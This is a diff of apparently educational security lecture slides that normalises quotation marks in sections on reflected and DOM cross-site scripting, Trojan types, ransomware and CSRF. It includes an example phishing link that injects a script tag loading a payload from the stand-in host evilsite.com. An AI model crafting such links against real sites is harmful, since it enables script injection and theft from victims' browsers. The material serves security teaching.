@@ -132,14 +132,14 @@ Image Credit: https://medium.com/iocscan/reflected-cross-site-scripting-r-xss-b0
 - An attacker sends a link to a target in email which looks like:
 
 ```html
-    https://vulnerablewebsite.com?q=news<\script%20src=”http://evilsite.com/payload.js"
+    https://vulnerablewebsite.com?q=news<\script%20src="http://evilsite.com/payload.js"
 ```
 - Along with a deceptive description like _Please review this suspicious transaction on your account_
 - A vulnerable website will return the unfiltered content of the query in the error message
 
 ```html
 Error!!
-    <script type=’text/javascript’>payload</script> not found.
+    <script type='text/javascript'>payload</script> not found.
 ```
 - When the error page is loaded, the payload is executed in the victim's browser
 
@@ -148,8 +148,8 @@ Error!!
 
 ## DOM XSS Attack
 
-- The attack payload is executed by modifying the DOM “environment” in the victim’s browser
-- The modification causes the original client side script to run in an “unexpected” manner
+- The attack payload is executed by modifying the DOM "environment" in the victim's browser
+- The modification causes the original client side script to run in an "unexpected" manner
 - The HTTP responses is not affected, the HTML does not contain the attack payload
 - The payload is in the body of the page as part of the DOM tree
 - The client side code now executes differently because of the DOM modification
@@ -367,12 +367,12 @@ Image Credit: https://techieandwhatever.blogspot.com/2017/06/what-is-zeus-malwar
 
 - _Destructive Trojan:_ Designed to destroy data stored a computer
   - Eg. Ransomware since the encrypted data is often never recovered
-- _Proxy Trojan:_ Uses the victim’s computer as a proxy server
+- _Proxy Trojan:_ Uses the victim's computer as a proxy server
   - Enables attackers to execute illicit acts from the infected computer
   - This is often used to creat BotNets or networks of controlled computers 
-- _FTP Trojan_: Uses port 21 to enable FTP file uploads to the victim’s computer
+- _FTP Trojan_: Uses port 21 to enable FTP file uploads to the victim's computer
 - _Security software disabler Trojan:_ Disables security software like firewalls and antivirus software
-- _Denial-of-Service attack Trojan:_ Designed to give the attacker ability to perform DOS attacks from victim’s computer.
+- _Denial-of-Service attack Trojan:_ Designed to give the attacker ability to perform DOS attacks from victim's computer.
 
 ---
 ## Ransomware - A Client Side Attack
@@ -806,7 +806,7 @@ drwxr-xr-x 6 secuser secuser 4096 Feb 27 20:40 ..
 
 ## Cross Site Request Forgery
 
-- Forces victim to execute unwanted actions in a web application where they’re currently authenticated
+- Forces victim to execute unwanted actions in a web application where they're currently authenticated
 - Flow of the attack
   - Victim authenticates to a site, web banking for example
   - User clicks on an infected link that executes a banking request
